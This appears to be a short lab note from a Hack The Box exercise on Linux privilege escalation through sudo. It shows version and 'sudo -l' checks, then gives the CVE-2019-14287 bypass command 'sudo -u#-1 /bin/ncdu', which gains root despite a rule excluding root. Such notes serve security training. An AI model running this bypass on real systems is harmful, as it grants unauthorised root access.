# Sudo

## Version

| VULNERABLE SUDO |
|---|
| 1.8.28 |

```sh
htb-student@ubuntu:~$ sudo -V
```

```output title="Output" hl_lines="1"
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

## Available Commands

```sh
htb-student@ubuntu:~$ sudo -l
```

```output title="Output" hl_lines="5"
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```

## [Policy Bypass](https://nvd.nist.gov/vuln/detail/cve-2019-14287)

```sh
htb-student@ubuntu~$ sudo -u#-1 /bin/ncdu
```
